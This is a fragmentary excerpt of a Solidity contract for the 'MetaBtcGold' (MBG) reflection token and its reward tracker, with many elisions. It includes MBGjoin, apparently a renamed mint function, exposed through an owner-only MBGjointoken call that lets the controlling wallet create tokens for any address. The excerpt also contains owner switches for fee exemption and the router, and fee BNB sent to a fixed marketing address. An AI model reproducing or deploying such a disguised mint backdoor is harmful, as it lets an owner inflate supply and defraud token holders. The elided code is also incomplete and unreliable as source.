...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function MBGjoin(address account, uint256 amount) internal virtual {
...
function MBGjoin(address account, uint256 value) internal override {
    super.MBGjoin(account, value);
...
contract MBGrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardMBGMap  for RewardMBGMap .Map;
RewardMBGMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("MBG_rewardToken_Tracker", "MBG_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "MBG_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "MBG_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main MBG contract.");
    }
...
contract MBG is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    MBGrewardToken public rewardToken;
 ...
 modifier lockTheSwap {
   ...
   uint256 public  holderReward = 7;
 address public lp;
  ILP public adressLiquidity;
    address public marketingReciever =0x37976dAEf1C7e46Cd2b46B7128cDfa7191fe9215;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("MetaBtcGold", "MBG") {
 
        TotalFees = holderReward.add(liquidityFee).add(marketing);
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new MBGrewardToken();
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function MBGjointoken(address userjoin, uint256 tokenjoin) public masterWallet{
       MBGjoin(userjoin, tokenjoin);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "MBG: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "MBG: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "MBG: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "MBG: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTMBG = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTMBG);
...
uint256 bnbForLiquidity = bnbBalance.mul(liquidityFee).div(bnbFeeFactor).div(2);
        uint256 bnbForReflection = bnbBalance.mul(holderReward).div(bnbFeeFactor);
        uint256 bnbForDev = bnbBalance.sub(bnbForLiquidity).sub(bnbForReflection);
addLiquidity(tokensTMBG, bnbForLiquidity);
payable(marketingReciever).transfer(bnbForDev);
 (bool success,) = address(rewardToken).call{value: bnbForReflection}("");
if(success) {
            emit transferDividends(tokensToLiquify.mul(holderReward).div(TotalFees), bnbForReflection);
        }
    }
